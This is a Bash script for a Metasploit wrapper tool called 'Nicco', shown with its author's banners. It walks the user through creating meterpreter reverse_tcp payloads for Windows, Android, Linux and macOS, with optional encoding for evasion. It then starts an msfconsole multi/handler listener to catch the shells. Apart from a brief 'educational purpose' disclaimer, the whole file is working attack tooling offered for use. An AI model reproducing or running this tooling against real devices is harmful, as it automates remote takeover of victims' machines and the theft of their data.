#!/bin/bash

#Color values
RED='\033[0;31m'
BLUE='\033[0;34m'
LIGHT_YELLOW='\e[93m'
LIGHT_CYAN='\033[1;36m'
LIGHT_GRAY='\033[0;37m'
LIGHT_RED='\033[1;31m'
LIGHT_GREEN='\033[1;32m'
LIGHT_BLUE='\033[1;34m'
LIGHT_PURPLE='\033[1;35m'

#Some important parameters
#Default Local ip
DL_ip=$(ifconfig | grep 'inet ' | awk '{print $2}' | head -n 1)
DL_port=8000
#Custom local ip
CL_ip=0
CL_port=0

#Logo function
animated_logo_function() {
    echo -e ${RED}
    str="                                        ▄   ▄ "
    for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}"
    sleep 0.01
    done
    echo -e ${LIGHT_GRAY} 
    str2="                                        █▀█▀█   
                                        █▄█▄█              
                                         ███  ▄▄    
                                         ████▐█ █    
                                         ████   █    
                                         ▀▀▀▀▀▀▀  "
    for ((i=0; i<${#str2}; i++)); do
    echo -n "${str2:$i:1}"
    sleep 0.001
    done
    echo -e ${LIGHT_RED}
    str3="                            ░█▄─░█ ─▀─ █▀▀ █▀▀ █▀▀█ 
                            ░█░█░█ ▀█▀ █── █── █──█ 
                            ░█──▀█ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀▀"                        
    for ((i=0; i<${#str3}; i++)); do
    echo -n "${str3:$i:1}"
    sleep 0.001
    done   
    str4="
                            ________________________"
    for ((i=0; i<${#str4}; i++)); do
    echo -n "${str4:$i:1}"
    sleep 0.001
    done | lolcat ;
    echo -e ${LIGHT_GRAY} 
    str5="                            Author - Anil Shrestha
                            Github - https://github.com/empath1928
                            Facebook - https://www.facebook.com/secrets.1928 "                           
    for ((i=0; i<${#str5}; i++)); do
    echo -n "${str5:$i:1}"
    sleep 0.001
    done
}

windows_payload_logo_function ()
{
                echo -e "
      ███████]▄▄▄▄▄▄▄▄ ${LIGHT_RED}*°•.˜°• █░█░█ █ █▄░█ █▀▄ █▀█ █░█░█ █▀   █▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄ •°*.•°*${LIGHT_CYAN}
▂▄▅█████████▅▄▃▂▂      ${LIGHT_RED}*°•.*°• ▀▄▀▄▀ █ █░▀█ █▄▀ █▄█ ▀▄▀▄▀ ▄█   █▀▀ █▀█ ░█░ █▄▄ █▄█ █▀█ █▄▀ •°*.•°*${LIGHT_CYAN}
████${LIGHT_GREEN}Nicco | ${LIGHT_YELLOW}By.${LIGHT_CYAN}████▄▃▂▂
|███${LIGHT_RED}Anil Shrestha${LIGHT_CYAN}██████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤                                 
        " ; echo -e "__________________________________________________________________________________________________________" | lolcat 
}

android_payload_logo_function ()
{
                echo -e "
      ███████]▄▄▄▄▄▄▄▄ ${LIGHT_RED}*°•.˜°• ▄▀█ █▄░█ █▀▄ █▀█ █▀█ █ █▀▄   █▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄ •°*.•°*${LIGHT_CYAN}
▂▄▅█████████▅▄▃▂▂      ${LIGHT_RED}*°•.˜°• █▀█ █░▀█ █▄▀ █▀▄ █▄█ █ █▄▀   █▀▀ █▀█ ░█░ █▄▄ █▄█ █▀█ █▄▀ •°*.•°*${LIGHT_CYAN}
████${LIGHT_GREEN}Nicco | ${LIGHT_YELLOW}By.${LIGHT_CYAN}████▄▃▂▂
|███${LIGHT_RED}Anil Shrestha${LIGHT_CYAN}██████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤                                 
        " ; echo -e "__________________________________________________________________________________________________________" | lolcat 
}

linux_payload_logo_function ()
{
                echo -e "
      ███████]▄▄▄▄▄▄▄▄ ${LIGHT_RED}*°•.˜°• █░░ █ █▄░█ █░█ ▀▄▀   █▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄ •°*.•°*${LIGHT_CYAN}
▂▄▅█████████▅▄▃▂▂      ${LIGHT_RED}*°•.˜°• █▄▄ █ █░▀█ █▄█ █░█   █▀▀ █▀█ ░█░ █▄▄ █▄█ █▀█ █▄▀ •°*.•°*${LIGHT_CYAN}
████${LIGHT_GREEN}Nicco | ${LIGHT_YELLOW}By.${LIGHT_CYAN}████▄▃▂▂
|███${LIGHT_RED}Anil Shrestha${LIGHT_CYAN}██████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤                                 
        " ; echo -e "__________________________________________________________________________________________________________" | lolcat 
}

mac_payload_logo_function ()
{
                echo -e "
      ███████]▄▄▄▄▄▄▄▄ ${LIGHT_RED}*°•.˜°• █▀▄▀█ ▄▀█ █▀▀   █▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄ •°*.•°*${LIGHT_CYAN}
▂▄▅█████████▅▄▃▂▂      ${LIGHT_RED}*°•.˜°• █░▀░█ █▀█ █▄▄   █▀▀ █▀█ ░█  █▄▄ █▄█ █▀█ █▄▀ •°*.•°*${LIGHT_CYAN}
████${LIGHT_GREEN}Nicco | ${LIGHT_YELLOW}By.${LIGHT_CYAN}████▄▃▂▂
|███${LIGHT_RED}Anil Shrestha${LIGHT_CYAN}██████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤                                 
        " ; echo -e "__________________________________________________________________________________________________________" | lolcat 
}

about_us_logo_function () {
animated_logo_function ; echo 
echo " 
●̮̮̃•̃)    Anil Shrestha_
/█\    █▀▀ █▀▄▀█ █▀█ ▄▀█ ▀█▀ █░█ 
.Π.    ██▄ █░▀░█ █▀▀ █▀█ ░█░ █▀█ 
" | lolcat ; sleep 0.5 ; echo -e ${LIGHT_CYAN}
str2="Beta_Nicco - An advance payload generation tool which automates your payload creation work. It also features some feature like ;-
"
for ((i=0; i<${#str2}; i++)); do
echo -n "${str2:$i:1}"
sleep 0.02
done ; echo -e ${LIGHT_YELLOW}
str3="[ 1 ] ---> Payload for any platform
[ 2 ] ---> Encoding the payload for aviation
[ 3 ] ---> Auto listner as well as Custom for easy process       "
for ((i=0; i<${#str3}; i++)); do
echo -n "${str3:$i:1}"
sleep 0.02
done ; echo -e ${LIGHT_CYAN}
str4="
This tool is only made for educational purpose to demonstrate how easy is that nowdays to compromise any devices over World with this type of scripts for anyone.
Please do not use it for any malecius purpsoe otherwise I won't be responsible...
Author - Anil Shrestha ( Empath )
Github - https://github.com/empath1928
Contact - anilshresthasaecrets@gmail.com 
"
for ((i=0; i<${#str4}; i++)); do
echo -n "${str4:$i:1}"
sleep 0.02
done ; read
} 

#error logo
error_check_logo_function () {
    if [ "$payload_option" == "1" ]
    then  
        echo -e ${LIGHT_BLUE} ; windows_payload_logo_function
    elif [ "$payload_option" == "2" ]
    then
        echo -e ${LIGHT_BLUE} ; android_payload_logo_function
    elif [ "$payload_option" == "3" ]
    then
        echo -e ${LIGHT_BLUE} ; linux_payload_logo_function
    elif [ "$payload_option" == "4" ]
    then
        echo -e ${LIGHT_BLUE} ; mac_payload_logo_function
    else 
        echo -e ${LIGHT_RED}
        str="Unknown error...Restarting the tool..."
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.1
        done ; sleep 2 ; clear ; ./Nicco.sh
    fi
}

#Custom Listner function
custom_listner_function () {
    animated_logo_function ; echo ; echo "
░█▀▀█ ░█─░█ ░█▀▀▀█ ▀▀█▀▀ █▀▀█ █▀▄▀█ 　 █── ─▀─ █▀▀ ▀▀█▀▀ █▀▀▄ █▀▀ █▀▀█ 
░█─── ░█─░█ ─▀▀▀▄▄ ──█── █──█ █─▀─█ 　 █── ▀█▀ ▀▀█ ──█── █──█ █▀▀ █▄▄▀ 
░█▄▄█ ─▀▄▄▀ ░█▄▄▄█ ──▀── ▀▀▀▀ ▀───▀ 　 ▀▀▀ ▀▀▀ ▀▀▀ ──▀── ▀──▀ ▀▀▀ ▀─▀▀" | lolcat ; echo
    echo -e ${LIGHT_RED} ; read -p "Payload for your target ▄︻̷̿┻̿═━一 " payload 
    while [ "$payload" == "" ]
    do
        echo -e ${LIGHT_RED} ; read -p "You can't leave it empty.. Set the payload" payload 
    done
    echo -e ${LIGHT_YELLOW} ; read -p "LHOST for the listner ▄︻̷̿┻̿═━一 " lhost
    while [ "$lhost" == "" ]
    do
        echo -e ${LIGHT_RED} ; read -p "You can't leave it empty.. Set the lhost  ▄︻̷̿┻̿═━ " lhost ; echo
    done
    echo -e ${LIGHT_GREEN} ; read -p "LPORT for the listner ▄︻̷̿┻̿═━一 " lport ; echo -e ${LIGHT_CYAN}
    while [ "$lport" == "" ]
    do
        echo -e ${LIGHT_RED} ; read -p "You can't leave it empty.. Set the lport  ▄︻̷̿┻̿═━ " lport
    done
    str="Starting your listner
LHOST = $lhost
LPORT = $lport
PAYLOAD = $payload"
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.04
    done  
    echo -e ${LIGHT_GREEN} ; echo
    str="Press CTRL+C to get back to the Main menu after you are done..."
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.04
    done 
    xterm -hold -title "Nicco ( Custom Listner )" -e msfconsole -q -x "set payload $payload; set lhost $lhost; set lport $lport; use exploit/multi/handler ; show options ; run" 
}


#After authorization ( Main While )
while true
do
#clearing the screen 
clear
#Calling Logo Function
animated_logo_function ; sleep 2 ; echo ; echo ; echo
echo -e ${LIGHT_CYAN} "         Available Features" ; echo -e "────────────────────────────────────────" | lolcat
echo -e ${LIGHT_GREEN} "  『1』${LIGHT_RED} *°•.${BLUE} Windows Payload${LIGHT_RED} .•°*${LIGHT_GREEN}
   『2』${LIGHT_RED} *°•.${BLUE} Android Payload${LIGHT_RED} .•°${LIGHT_GREEN}
   『3』${LIGHT_RED} *°•.${BLUE} Linux Payload${LIGHT_RED}   .•°*${LIGHT_GREEN}
   『4』${LIGHT_RED} *°•.${BLUE} Mac Payload${LIGHT_RED}     .•°*${LIGHT_GREEN}
   『5』${LIGHT_RED} *°•.${BLUE} Custom Listner${LIGHT_RED}  .•°*${LIGHT_GREEN}
   『6』${LIGHT_RED} *°•.${BLUE} About Us${LIGHT_RED}        .•°*${LIGHT_GREEN}
   『9』${LIGHT_RED} *°•.${BLUE} Exit${LIGHT_RED}            .•°*" ; echo -e ${LIGHT_BLUE} 
   read -p " ▄︻̷̿┻̿═━一 " payload_option 


#Payload oprion part ( inputs = platform.txt )
#Windows payload
    if [ $payload_option == 1 ]
    then
        clear ; windows_payload_logo_function 
        echo exe > modules/msf_module/generate/inputs/format.txt
        echo windows > modules/msf_module/generate/inputs/platform.txt ; break
#Android payload
    elif [ $payload_option == 2 ]
    then
        clear ; android_payload_logo_function 
        echo apk > modules/msf_module/generate/inputs/format.txt
        echo android > modules/msf_module/generate/inputs/platform.txt ; break
#Linux payload
    elif [ $payload_option == 3 ]
    then
        clear ; linux_payload_logo_function 
        echo elf > modules/msf_module/generate/inputs/format.txt
        echo linux > modules/msf_module/generate/inputs/platform.txt ; break
#Mac payload
    elif [ $payload_option == 4 ]
    then
        clear ; mac_payload_logo_function 
        echo macho > modules/msf_module/generate/inputs/format.txt
        echo osx > modules/msf_module/generate/inputs/platform.txt ; break
#Custom Listner
    elif [ $payload_option == 5 ]
    then
        clear ; custom_listner_function
# About US
    elif [ $payload_option == 6 ]
    then
        clear ; about_us_logo_function ; 
# Exiting
    elif [ $payload_option == 9 ]
    then
        echo -e ${LIGHT_CYAN}
        str="Thanks for using ;)"
        for ((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.1
        done  ; sleep 2 ; exit

#First phase invalid 
    else
    echo -e ${LIGHT_RED}
    str="Invalid payload option..."
    for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}"
    sleep 0.1
    done ; sleep 1 ; echo 

    fi
done

#Payload Types ( input = payload.txt )
while true
do
    echo -e ${LIGHT_CYAN}
    str="    Payload Types"
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.01
    done ; echo -e ${LIGHT_PURPLE}
    str="    ╔════════════════════════╗
    | 1 | --> Staged Payload |
    ╚════════════════════════╝
    ╔═════════════════════════════╗
    | 2 | --> Non-Staged Payload  |
    ╚═════════════════════════════╝" 

    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.005
    done ; echo -e ${LIGHT_GRAY} ; echo ; read -p "Select the payload type...  

▄︻̷̿┻̿═━一 " payload_type
#All payload optoins with staged
    if [[ ("$payload_option" == "1" || "$payload_option" == "2" ) && "$payload_type" == "1" ]]
    then
        echo $(cat modules/msf_module/generate/inputs/platform.txt)/meterpreter/reverse_tcp > modules/msf_module/generate/inputs/payload.txt  
        cp -r modules/msf_module/generate/inputs/payload.txt modules/msf_module/listner/payload.txt ; echo -e ${LIGHT_GREEN} 
        str="Selecting $(cat modules/msf_module/generate/inputs/platform.txt) staged payload ---> $(cat modules/msf_module/generate/inputs/payload.txt)"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.05
        done ; sleep 2 ; break
    
    elif [[ "$payload_option" == "3"  &&  "$payload_type" == "1" ]]
    then
        echo $(cat modules/msf_module/generate/inputs/platform.txt)/x86/meterpreter/reverse_tcp > modules/msf_module/generate/inputs/payload.txt  
        cp -r modules/msf_module/generate/inputs/payload.txt modules/msf_module/listner/payload.txt ; echo -e ${LIGHT_GREEN} 
        str="Selecting $(cat modules/msf_module/generate/inputs/platform.txt) staged payload ---> $(cat modules/msf_module/generate/inputs/payload.txt)"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.05
        done ; sleep 2 ; break

    elif [[ "$payload_option" == "4"  &&  "$payload_type" == "1" ]]
    then
        echo $(cat modules/msf_module/generate/inputs/platform.txt)/x64/meterpreter/reverse_tcp > modules/msf_module/generate/inputs/payload.txt  
        cp -r modules/msf_module/generate/inputs/payload.txt modules/msf_module/listner/payload.txt ; echo -e ${LIGHT_GREEN} 
        str="Selecting $(cat modules/msf_module/generate/inputs/platform.txt) staged payload ---> $(cat modules/msf_module/generate/inputs/payload.txt)"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.05
        done ; sleep 2 ; break


#All payload options with non-staged
    elif [[ ("$payload_option" == "1" || "$payload_option" == "2" ) && "$payload_type" == "2" ]]
    then
        echo $(cat modules/msf_module/generate/inputs/platform.txt)/meterpreter_reverse_tcp > modules/msf_module/generate/inputs/payload.txt 
        cp -r modules/msf_module/generate/inputs/payload.txt modules/msf_module/listner/payload.txt ; echo -e ${LIGHT_GREEN} 
        str="Selecting $(cat modules/msf_module/generate/inputs/platform.txt) non-staged payload ---> $(cat modules/msf_module/generate/inputs/payload.txt)"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.05
        done ; sleep 2 ; break
    
    elif [[ "$payload_option" == "3"  &&  "$payload_type" == "2" ]]
    then
        echo $(cat modules/msf_module/generate/inputs/platform.txt)/x86/meterpreter_reverse_tcp > modules/msf_module/generate/inputs/payload.txt 
        cp -r modules/msf_module/generate/inputs/payload.txt modules/msf_module/listner/payload.txt ; echo -e ${LIGHT_GREEN} 
        str="Selecting $(cat modules/msf_module/generate/inputs/platform.txt) non-staged payload ---> $(cat modules/msf_module/generate/inputs/payload.txt)"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.05
        done ; sleep 2 ; break

    elif [[ "$payload_option" == "4"  &&  "$payload_type" == "2" ]]
    then
        echo $(cat modules/msf_module/generate/inputs/platform.txt)/x64/meterpreter_reverse_tcp > modules/msf_module/generate/inputs/payload.txt ; echo -e ${LIGHT_GREEN} 
        str="Selecting $(cat modules/msf_module/generate/inputs/platform.txt) non-staged payload ---> $(cat modules/msf_module/generate/inputs/payload.txt)"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.05
        done ; sleep 2 ; break

#Second phase invalid 
    else
    echo -e ${LIGHT_RED}
    str="Invalid payload type..."
    for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}"
    sleep 0.1
    done ; sleep 2 ; echo -e ${LIGHT_PURPLE} ; clear 
    error_check_logo_function
    fi
done


#Main input collection part ( ip.txt, port.txt, encoder.txt, layer.txt, payload_name.txt )
#LAN_or_WAN
while true
do
    clear 
    error_check_logo_function
    echo -e ${LIGHT_GRAY} ; echo -e "
______________¶¶¶
____________¶¶____¶¶
___________¶¶¶_______¶
__________¶¶¶¶________¶¶
__________¶__¶¶_________¶¶____¶¶     ${LIGHT_RED}( Nicco ) By - Anil Shrestha ( Empath )${LIGHT_GRAY}
_________¶¶__¶¶¶______¶¶¶¶¶¶___¶     ${LIGHT_YELLOW}█▀█ ▄▀█ █▄█ █░░ █▀█ ▄▀█ █▀▄   █▀█ ▄▀█ █▄░█ █▀▀ █▀▀${LIGHT_GRAY}
_________¶¶___¶¶__¶¶¶¶¶¶__¶¶         ${LIGHT_YELLOW}█▀▀ █▀█ ░█░ █▄▄ █▄█ █▀█ █▄▀   █▀▄ █▀█ █░▀█ █▄█ ██▄${LIGHT_GRAY}
______¶¶__¶¶___¶¶__________¶¶             
___¶¶_______¶¶___¶¶_________¶¶       ${LIGHT_CYAN}( 1 ) ▄▄▄▄▄▄▄▄-----------● Local Area Network ( LAN )${LIGHT_GRAY}
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶________¶¶      ${LIGHT_CYAN}( 2 ) ▄▄▄▄▄▄▄▄-----------● Wide Area Network ( WAN ) ${LIGHT_RED}>  only available in full version... ${LIGHT_GRAY}
¶¶¶¶¶___¶______¶___¶¶¶¶¶_____¶¶
______¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶
______¶__¶¶_¶¶¶¶¶¶
_____¶______¶¶___¶
___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
__¶¶________¶¶¶____¶¶
    ${LIGHT_RED}" ; read -p " ▄︻̷̿┻̿═━一  " LAN_or_WAN 
#DL or CL Ip & Port
# LAN 
    if [ "$LAN_or_WAN" == "1" ]
    then
        echo -e ${LIGHT_CYAN}
        str="Hosting $(cat modules/msf_module/generate/inputs/payload.txt) payload over Local Area Network ( LAN )"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.02
        done ; echo ; echo -e ${LIGHT_YELLOW} ; read -p "Select IP Adress ( skip for default : $DL_ip ) ▄︻̷̿┻̿═━一 " CL_ip  
        read -p "Select port under range 1-65535 ( skip for default : $DL_port ) ▄︻̷̿┻̿═━一 " CL_port 
        if [[ "$CL_ip" == "" && "$CL_port" == "" ]]
        then
            echo $DL_ip > modules/msf_module/generate/inputs/ip.txt 
            echo $DL_port > modules/msf_module/generate/inputs/port.txt 
            echo $DL_port > modules/msf_module/listner/port.txt ; break

        elif [[ "$CL_ip" != "" && "$CL_port" == "" ]]
        then
            echo $CL_ip > modules/msf_module/generate/inputs/ip.txt 
            echo $DL_port > modules/msf_module/generate/inputs/port.txt 
            echo $DL_port > modules/msf_module/listner/port.txt; break

        elif [[ "$CL_ip" == "" && "$CL_port" != "8000" ]]
        then
            echo $DL_ip > modules/msf_module/generate/inputs/ip.txt 
            while [ "$CL_port" -gt "65535" ]
            do 
            echo -e ${LIGHT_RED}  
            read -p "Select any port range under (1 - 65535) ▄︻̷̿┻̿═━一 " CL_port
            done
            echo $CL_port > modules/msf_module/generate/inputs/port.txt 
            echo $CL_port > modules/msf_module/listner/port.txt ; break

        elif [[ "$CL_ip" != "" && "$CL_port" != "8000" ]]
        then 
            echo $CL_ip > modules/msf_module/generate/inputs/ip.txt 
            while [ "$CL_port" -gt "65535" ]
            do 
                echo -e ${LIGHT_RED}  
                read -p "Select any port range under ( 1 - 65535 ) ▄︻̷̿┻̿═━一 " CL_port
            done
            echo $CL_port > modules/msf_module/generate/inputs/port.txt 
            echo $CL_port > modules/msf_module/listner/port.txt ; break
        else
            str="Unexpected error... Restarting the tool again..."
            for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.02
        done ; sleep 2 ; bash Nicco.sh
        fi
# WAN
    elif [ "$LAN_or_WAN" == "2" ]
    then
        echo
        echo -e ${LIGHT_RED}
        str="Only available in full version... Restarting the tool..."
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.02
        done ; sleep 2 ; ./Beta_Nicco.sh

    echo -e ${LIGHT_RED} 
    str="Select proper option..."
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.04
    done ; sleep 2 
    
    fi  
done

# Encoder, layer, payload name
while true
do
    echo -e ${LIGHT_GRAY} ; read -p "Give a name for your payload ▄︻̷̿┻̿═━一 " payload_name
    while [ "$payload_name" == "" ]
    do 
        echo -e ${LIGHT_RED} ; read -p "You can't leave it empty, Give it a name  ▄︻̷̿┻̿═━一 " payload_name
    done ; echo $payload_name > modules/msf_module/generate/inputs/payload_name.txt
    echo -e ${LIGHT_PURPLE}
    str="Do you want to use an encoder ? (Y/n)" 
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.04
    done ; read -p " ▄︻̷̿┻̿═━一 " encoder_optional
    while [ "$encoder_optional" == "" ]
    do 
        echo -e ${LIGHT_RED} ; read -p "Don't leave it empty, Answer it on Yes or No ( Y/n) ▄︻̷̿┻̿═━一 "  encoder_optional
    done
    if [[ ("$encoder_optional" == "Yes" || "$encoder_optional" == "YES" || "$encoder_optional" == "Y" || "$encoder_optional" == "y") ]]
    then 
        echo yes > modules/msf_module/generate/encoders/encoder_optional.txt
        echo "$(cat modules/msf_module/generate/encoders/encoders.txt)" | lolcat ; echo -e ${LIGHT_CYAN}  
        read -p "Encoder value  ▄︻̷̿┻̿═━一 " encoder_value 
        while [ "$encoder_value" == "" ]
        do 
            echo -e ${LIGHT_RED} ; read -p "You can't leave it empty, Select the correct encoder ▄︻̷̿┻̿═━一 " encoder_value
        done ; echo -e ${LIGHT_CYAN}
        read -p "Number of layers for encoding  ▄︻̷̿┻̿═━一 " layers
        echo encoder$encoder_value > modules/msf_module/generate/inputs/encoder.txt
        echo $layers > modules/msf_module/generate/inputs/layers.txt
        echo
        str="Creating your $(cat modules/msf_module/generate/inputs/platform.txt) payload..."
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.04
        done ; xterm -title "Nicco ( Payload Generator )" -e ./modules/msf_module/generate/generate_payload.sh ; break
    
    elif [[ ("$encoder_optional" == "NO" || "$encoder_optional" == "No" || "$encoder_optional" == "N" || "$encoder_optional" == "n") ]] 
    then 
        echo
        echo no > modules/msf_module/generate/encoders/encoder_optional.txt
        str="Creating your $(cat modules/msf_module/generate/inputs/platform.txt) payload..."
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.04
        done ; echo ; xterm -title "Nicco ( Payload Generator )" -e ./modules/msf_module/generate/generate_payload.sh ; break
    else 
        echo -e ${LIGHT_RED} 
        str="Answer it on Yes or No ( Y/n) ▄︻̷̿┻̿═━一 "
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.04
        done ; sleep 2 ; echo 
    fi
done

while true 
do 
    echo ; echo ; echo -e ${LIGHT_CYAN}"Your payload is saved in $(pwd)/payloads/$(cat modules/msf_module/generate/inputs/platform.txt)  " ; echo -e ${LIGHT_GRAY}
    str="Do you want to start the listner ? ( Y/n) ▄︻̷̿┻̿═━一 "
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.04
    done ; read listner
    if [[ ("$listner" == "YES" ||  "$listner" == "Yes" || "$listner" == "yes" ||  "$listner" == "Y" ||  "$listner" == "y") ]]
    then 
    echo -e ${LIGHT_CYAN}
    str="Starting the listner..., Close it after you are done "
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.04
    done ; sleep 1 ; xterm -hold -title "Nicco ( Listner )" -e msfconsole -q -x "set payload $(cat modules/msf_module/listner/payload.txt); set lhost 0.0.0.0; set lport $(cat modules/msf_module/listner/port.txt); use exploit/multi/handler ; show options ; run" 
    break

    elif [[ ("$listner" == "NO" ||  "$listner" == "No" || "$listner" == "no" || "$listner" == "N" ||  "$listner" == "n") ]]
    then
        break 

    else
        echo
        echo -e ${LIGHT_RED} 
        str="Unexpected error, Restarting the tool..."
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.04
        done ; sleep 2; ./Beta_Nicco.sh
    fi 
done 

./Beta_Nicco.sh
